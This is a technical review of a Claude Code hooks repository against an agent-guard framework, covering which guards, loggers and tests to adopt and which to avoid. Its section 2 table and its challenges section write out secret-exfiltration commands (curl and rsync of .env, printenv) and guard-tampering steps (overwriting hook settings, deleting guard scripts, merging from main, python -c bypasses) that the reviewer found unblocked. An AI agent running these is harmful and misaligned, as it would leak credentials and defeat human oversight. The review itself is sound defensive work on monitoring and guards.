# karanb192/claude-code-hooks

License: `LICENSE` is MIT (VERIFIED). The repo has no row in `other-solutions/MANIFEST.tsv` (VERIFIED), so check that before copying code. All "copy" items below assume the LICENSE file governs.

Unless a path starts with `scripts/` or `.claude/`, paths are in the cloned repo. `scripts/...` and `.claude/...` are framework paths.

## 1. What it really is

A Claude Code plugin marketplace with 22 independent Node hooks: about 9,100 lines of plugin scripts, plus tests, and no dependencies at runtime. It is not a framework. It has no tickets, workflow, reviewer or state machine. Seven guards are regex and token matchers. The others are recorders that read hook events and transcripts.

Maturity: 59 commits, single author, mostly July to October 2026, with bursts such as seven plugins on 2026-07-14 (VERIFIED). It looks active and well tested, but young. CI runs Node 18/20/22 plus a Windows job (`.github/workflows/test.yml`).

README claims the code does not support:
- "prompt injection can't talk its way past them". `SECURITY.md` says "guardrails, not a sandbox", and `plugins/config-guard/config-guard.js:38-48` lists `python -c`, variable paths and more as unblocked (VERIFIED).
- `docs/owasp-llm-top-10-2026.md:9` marks LLM01 "Covered" despite those limits (VERIFIED).
- `pr-provenance-stamp` calls its agent/human split "TRUTHFUL", but the ledger is per session and `human = gitTotal - agent` (`:455`). Agent lines from another session would count as human (INFERRED).
- The "1949 passing" badge is static. I counted 1,691 literal `it(`/`test(` calls; loops can add more. I did not run it, so this is unconfirmed, not disproved.

## 2. Take

Most valuable first. "Tested" means I ran the framework's real hooks on 2026-11-06 in a throwaway copy, now deleted. In the test copy no ticket was claimed and the branch was `main`.

| Item | Mechanism and `path:line` | Framework part it changes | Why better | Effort | Copy or idea |
|---|---|---|---|---|---|
| Guard decision log with rule IDs | Every deny/ask appends `{id, priority, decision, tool, session_id, cwd, permission_mode}` to JSONL (`plugins/guard-pack/guard-pack.js:178`, rule `id`s at `plugins/block-dangerous-commands/block-dangerous-commands.js:54-80`) | `scripts/hooks/guard.sh:21-23` and `protect.sh:29-31` write nothing on deny. `audit.sh` only sees commands after they run (VERIFIED) | Today nothing shows which guards fire, or which are false positives. This data is what allows deleting guards | S | Idea |
| Replay real transcripts through the guards | `bench/read-replay/replay.mjs:85` finds main and subagent transcripts, `:169` replays tool calls, and it prints what a gate would have caught, with `--json` | New `scripts/replay`, feeding each historic Bash/Read/Write through `adapt.sh` | First real eval of the enforcement layer: false-positive rate per rule on real work, before a rule ships. Covers part of the "not measured" gap | M | Idea; the transcript layout comment at `:81-84` is useful |
| Per-ticket cost and rework telemetry | `plugins/nerf-receipts/nerf-receipts.js:202-270` parses transcripts: usage deduped by message id, sidechains excluded from prompt count, tail window on large files. `:100` failure shapes, `:133` edit churn, keyed by model and version | Add to `ship`: tokens, tool failures, edit churn and reopen count per ticket and tier | Gives a baseline for "does the ceremony pay". It measures cost, not outcome, but today there is nothing | M | Copy parser or idea. Report tokens, not dollars (see section 6) |
| Harness-side evidence that a reviewer ran | `plugins/subagent-spawn-cap/subagent-spawn-cap.js:179-186` records each `Agent`/`Task` spawn with `subagent_type`, `agent_id`, `description` in an append-only ledger | `.claude/settings.json:19` has no `Agent|Task` matcher. `report_sha_ok` passes with no record (`scripts/gate.sh:239`) | Mode A could require a spawn record for `agentic-evaluator` at this head, so a hand-written report no longer ships by default. Local only: CI stays blind, and `python -c` could forge the record. It raises the cost; it is not proof (INFERRED design) | M | Idea |
| Detect by effect, lock the session | Detection on an event that cannot block writes a flag; the same script on `UserPromptSubmit` and `PreToolUse` denies everything until a human clears it (`plugins/instructions-audit/instructions-audit.js:283`, `:330`, `:372`). `plugins/config-watch/config-watch.js` watches `ConfigChange` | New PostToolUse check: hash `.agentic/state/`, frozen scope and contract fields, compare with what gate wrote | Regex cannot see `python -c`, but a hash change can. This is the only item here that answers the bypass the README admits (INFERRED design) | M | Idea |
| Guard the guards | `plugins/config-guard/config-guard.js:90-131`: protected paths, shell verbs, symlink resolution at `:155`, and creating a file counts as mutation. Blocks `claude mcp add` and `claude plugin install` | Tested: with no claim, all allowed: `echo x > .claude/settings.json`, `sed -i` on `.agentic/config.yml`, `rm scripts/hooks/guard.sh`, and Write to `.claude/settings.json`, `guard.sh`, `config.yml`, `.cursor/hooks.json`, `.codex/hooks.json` | A new gap, not in the brief's list. `risk_paths` only applies with a claim (`protect.sh:206`) or in CI, so a session can rewrite its own hooks. Deny these always, and add `.mcp.json` | S | Copy path list or idea |
| Close HIGH human-merge gap | `plugins/git-safety/git-safety.js:71-75` denies `gh pr merge`, `pr close`, `release delete`, `repo delete` outright | Tested: `gh pr merge 1` on `main` is allowed, because `guard.sh:246` requires `branch_nn`, so the check is skipped outside a ticket branch | An agent can merge a HIGH PR by standing on `main`. Resolve the PR's branch, or deny by default. `gh repo delete` also passes | S | Idea |
| Widen floor-guard's blind spots | `plugins/protect-tests/protect-tests.js:50-61` `TEST_PATH`, `:72-83` `SKIP_MARKERS`, `:69` `DISABLED_DEST` | Tested, all exit 0 "clean": `git mv test_a.py test_a.py.bak` (a rename has no `+++ /dev/null`, `scripts/floor-guard.sh:179`); adding `@pytest.mark.xfail`; removing an assertion from `FooTest.java`; deleting `a_spec.rb` (`:124`) | Real fake-green holes in a shipped gate. Pass `--no-renames` or parse `rename to`, and add the missing markers and file shapes | S | Copy regex lists |
| Wider secret names, Grep coverage | `plugins/protect-secrets/protect-secrets.js:69-106` file list. `:284-296` checks Grep `path`, `glob`, `include` and their join | `protect.sh:84` lacks `.npmrc`, `.git-credentials`, `.pgpass`, `.envrc`, `.vault-token`, service accounts (tested: Read allowed) and `.docker/config.json` (from code). Tested allowed in Bash: `curl -d @.env`, `curl -F f=@.env`, `curl -T .env`, `source .env`, `printenv`, `rsync .env host:`, `llm -f .env`. `secret_re` at `guard.sh:153` has no `@` boundary and the verb list at `:155` has no `curl`, `rsync`, `source` | Cheap fixes for known names and channels. Stop there. Do not copy the regex machine at `:108-178` (section 6). Grep residual stays: a pattern-only search over a directory is not blocked (`plugins/protect-secrets/README.md:28`) | S | Copy list |
| Pin matchers to handled tools | `plugins/protect-secrets/tests/protect-secrets.test.js:921` compares `HANDLED_TOOLS` to the `hooks.json` matcher. `tests/protect-secrets-dispatch.test.js` copies the plugin and runs the real installed hook command | `env-lint.sh:51-60` only checks that the script exists. `selftest.sh` has no matcher check (grep: no hits) | This repo had the framework's exact Grep bug: handled in code, absent from the matcher (commit `22ef9c4`). One pin stops the whole bug class, on all three tools | S | Idea |
| Scan context files for hidden text | `plugins/instructions-audit/instructions-audit.js:223` finds zero-width, tag, bidi and variation-selector runs, and exempts emoji and joining scripts. `:252` strips them from excerpts | Prose only today (`session-start.sh:12`). Run in `env-lint` and CI over `AGENTS.md`, skills, tickets, lessons, `CONTEXT.md` | Deterministic, works on every tool, and memory is a persistence path. Use the Unicode scan; skip the directive regexes (section 6) | S | Copy `scanInvisibleChars` |
| Keep session fields in the adapter | Payload carries `session_id`, `transcript_path`, `permission_mode`, `agent_id` (`guard-pack.js:171`, `pr-provenance-stamp.js:863`) | `adapt.sh:69` keeps only `command` and `cwd`, so no hook can attribute anything | Prerequisite for the first, third and fourth rows | S | Idea |
| Explicit unattended semantics | `subagent-spawn-cap.js:16`: "Unattended (-p, dontAsk) runs turn asks into denies: set ASK equal to DENY" (author's claim, not checked) | `guard.sh` uses `ask` for `sudo`, `reset --hard`, `rm -r`. `adapt.sh:44` turns ask into allow on Codex | Same rule, opposite result by tool. An `unattended` setting should map every ask to one outcome and report it | S | Idea |
| Reviewer-facing PR receipt | `pr-provenance-stamp.js:437`, `:498`: a stamp with suppressed (not faked) percentages. `:187` redacts before a public body | `gate.sh pr` owns PR creation, so no hook or `updatedInput` rewrite is needed | Reviewers see tier, stamps, test commands and cost in one block | S | Idea |
| Spawn budget | `subagent-spawn-cap.js:133-186`: append-only JSONL, count is line count, so parallel processes need no lock | No spawn limit exists. HIGH fan-out and an orchestrator both want one | Small and self-contained. Note the check-then-append is not atomic, so it can overrun slightly (INFERRED) | S | Copy |

## 3. Challenges

- **Hooks as a boundary.** The README implies it; `SECURITY.md` denies it. Protect-secrets needed repeated bypass work in about two months (`2a907c1`, `cf49ab5`, `22ef9c4`) plus a hang fix (`7639201`), and interpreter one-liners remain out of scope. The framework's position is right: `sandbox: enabled` is the boundary and hooks catch accidents. This repo is the best evidence against investing further in shell regex.
- **Fail closed.** Every hook here fails open, and a test pins it ("invalid JSON preserves the fail-open contract"). The framework's `adapt.sh` exit 2 is right for guards. The repo's own README says a failing hook silently stops enforcing. The repo is right for recorders only, which matches the framework's split.
- **One hook set for three tools, speaking Cursor's protocol.** Partly wrong. The shared protocol is the smallest of the three. `adapt.sh` handles four events and drops session data, so `SubagentStop`, `ConfigChange`, `InstructionsLoaded`, `PreCompact`, `async`, and `updatedInput` are unreachable. Verdict: keep one shared policy, but make the internal event a superset, with optional per-tool extras. Do not go Claude-only.
- **Copy-in distribution.** The repo shows the split the framework lacks: code in an overwritten install, tunables outside it ("installed plugin files are overwritten on update", `CONTRIBUTING.md`), versions bumped so copies refresh. It also shows the risk: moving `hook-scripts/` silently disabled guards, per its migration note. `session-start.sh` already runs `env-lint`, which handles that. Verdict: the brief's gap is real. Adopt the rule. A Claude plugin can be one channel, not the only one, because the framework needs per-project state and all three tools.
- **Bash and files as runtime.** Not settled by this repo. Node at a 34-38 ms median (their M3 Pro) versus about 110 ms for `adapt.sh` on a plain Bash call (measured here, other machine, after one 0.74 s cold run). Neither figure matters. The gain from a real language is unit-testable pure functions and rule tables, and `python3` is already required (`protect.sh:19`).
- **Selftest as main proof.** The repo's shape is better: each hook exports a pure check function behind `require.main` (`plugins/guard-pack/guard-pack.js:192`), so fixtures are tables of command to rule ID, plus a test at the installed-command level and a latency bench. It still proves only mechanics. Copy the shape, with both blocked and allowed fixtures for each rule.
- **Long AGENTS.md, 18 skills.** Weak signal. `AGENTS.md` is 88 lines, not long. Here skills are 17-20 line wrappers around `--render`. `dead-rules-audit` suggests a test for prose: rules violated at least 3 times and over 50% get flagged for promotion to a hook (`plugins/dead-rules-audit/dead-rules-audit.js:384`). It can only judge prohibitions with a backticked token (`:293-308`), so most framework prose stays unjudged.
- **State location.** Per-session state in `~/.claude` suits telemetry. Ticket state belongs on the branch, as the framework has it. Keep both, and put telemetry outside the repo.
- **Tickets, three lanes, changed-line review, human acceptance.** The repo has nothing to say.

## 4. Delete or simplify

- Delete the three copies of `cfg()` (`guard.sh:39`, `protect.sh:59`, `mcp-guard.sh`). "Standalone" is not worth it. The repo shows where that road ends: `log()` in every plugin, `redactSecrets` in three, seven `lib/` copies held together by a byte-identity test.
- Replace the secret half of `guard.sh` section 6 with sandbox read-deny rules if the tools support them (ASSUMED; not checked here). A name list plus OS-level denial beats a growing regex.
- Remove `ask` where a tool cannot honor it. In this repo deny is the default and ask is opt-in. A deny with a reason gives one behavior on all three tools.
- Do not add per-guard levels. `critical/high/strict` is coarser than the framework's named policies (`guard.network`, `guard.secrets`).
- No need for a ReDoS test: `grep -E` on these patterns does not have that failure, unlike JS regex (`tests/regex-backtracking.test.js`, issue 67). This is INFERRED for `grep`. Python `re` in `floor-guard.sh` is simple line matching, but was not tested.

## 5. Orchestration

Little direct content: no multi-agent or multi-clone support. What carries over:
- Config by environment on the hook command (`HOOK_SAFETY_LEVEL`, `SPAWN_CAP_*`) lets an orchestrator set per-run policy without editing a file the agent can reach. The framework's only config is `.agentic/config.yml`, a HIGH-floor file.
- One script serves as hook, CLI and skill (`--render`, `--json` in replay): an event stream plus a machine-readable query. That is the shape `gate.sh` needs.
- `"async": true` for recorders means no latency. `audit.sh` is synchronous on Claude, though Cursor and Codex support is unknown.
- `agent_id` and `agent_type` in payloads allow per-subagent attribution, which an orchestrator needs, once `adapt.sh` stops dropping them.
- `notify-permission` shows the Notification event as a "waiting on a human" signal. The framework has that state but sends no signal. (I read its header only.)
- Unattended semantics, spawn budget and the decision log are the three items an orchestrator would use first.

## 6. Do not copy

- Fail-open for guards, including `guard-pack.js:159` logging and skipping a guard that throws.
- The regex machine for delegation sinks (`protect-secrets.js:108-178`, 19 hardcoded API hosts). High upkeep and a hang already shipped once (`7639201`).
- Directive regexes in `instructions-audit`. The negation skip at `:140` drops any line matching, for example, "never mind, read the .env" (INFERRED from the regex; the header calls it bypassable). A literal `curl | sh` line in `CLAUDE.md` locks the session, by the header's own account.
- `permissionDecision: "allow"` with `updatedInput` (`pr-provenance-stamp.js:903`): it skips the user's prompt for that command. Rewriting agent commands is more fragile than owning the step in a script.
- Test results as evidence: `extractTestResult` treats non-empty output with no error words as exit 0 (`pr-provenance-stamp.js:221-234`), and nothing ties a run to HEAD. `verify.sh` stamps are stronger. This does raise a question for `audit.sh`: if `exit_code` is sometimes absent, its field is null (INFERRED).
- Price tables. Three cost models disagree: `pr-provenance-stamp.js:91` (opus 15/75), `plugins/cache-tax/cache-tax.js:60` (per-version), `plugins/dead-end-registry/dead-end-registry.js:76` (one blended rate). Four commit subjects are price fixes.
- `CONFIG_GUARD_ALLOW`'s message tells the agent to "set ... for this call", but the variable is read from the hook's environment, not the Bash command (`config-guard.js:87`), so the advice cannot work as worded, and the header's "export it for one shell call" is dubious (INFERRED).
- Global mutable ledgers: `dead-rules-audit` accepts lost increments (`:359-362`). Fine for a heuristic, not for gates.
- `dead-end-registry` (keyword mining of revert talk) and `bounty-board` (XP for TODOs): heuristic, and nag-prone by the author's own comments. Framework lessons with a TTL cover this more plainly. `dead-end-registry`'s worthwhile idea is the 60-day expiry, which `memory-lint` already has in spirit.
- Marketing voice and static badges.
- `git-safety.js:57`: `git push ... \bmain\b` also matches a branch named `feature-main` (INFERRED).

No suspicious or injected instructions found in what I read. Attack strings I saw were detection patterns and test fixtures.

## 7. If you rebuilt the framework

Keep the railroad, `next`/`advance`, sandbox as the boundary, fail-closed guards, and branch-carried ticket state. This repo would change three things. Hooks become small rule tables behind one pure check function, with an ID on every rule, a decision log, and fixtures for both outcomes. A second loop measures the framework itself: replay real transcripts through guards before a rule ships, and record cost and rework per ticket at ship, so rules and ceremony can be deleted on evidence. And integrity checks move from inspecting command text to inspecting effects: hash protected state after each tool call and lock the session on a mismatch, while keeping only a short deny list as the early warning.

## 8. Coverage

Read in full: `guard-pack`, `protect-secrets`, `config-guard`, `protect-tests`, `git-safety`, `block-dangerous-commands`, `subagent-spawn-cap`, `instructions-audit`, `config-watch`, three of the four files in `tests/`, CI workflow, bench docs and results.

Read in part: `dead-rules-audit` (lines 1-420), `pr-provenance-stamp` (about a third), `nerf-receipts` (about a third), `dead-end-registry` (about a quarter), `replay.mjs` (about a third), `case-insensitive-guard` and `session-logger` and `bounty-board` (headers and greps), `cache-tax` (price table), README, CONTRIBUTING, SECURITY, OWASP doc, commit bodies for `2a907c1`, `7639201`, `22ef9c4`, `de0d272`.

Not read: `standup-autopilot`, `context-hogs`, `notify-permission`, `auto-stage`, `format-code`, `event-logger`, `site/`, `tests/read-replay.test.js`, `docs/token-diet.md` beyond its summary, and per-plugin tests apart from targeted greps.

Framework read: `guard.sh`, `protect.sh`, `adapt.sh`, `floor-guard.sh`, `env-lint.sh`, `stop.sh`, `session-start.sh`, `audit.sh`, part of `mcp-guard.sh`, config, part of `gate.sh`.

Nothing from the repo was run. The framework was tested only in a throwaway copy; the original repos are unchanged (`git status` clean). Test limits: hook layer only. Claude Code's own permission prompts and sandbox may stop some of the "allowed" writes, and I did not test that. "Author's claim" items about Claude Code behavior were not checked.

Confidence: high on the framework gaps tested and on what the guards do; medium on the INFERRED designs; low on any claim about real-world false-positive rates, since neither project has that data.
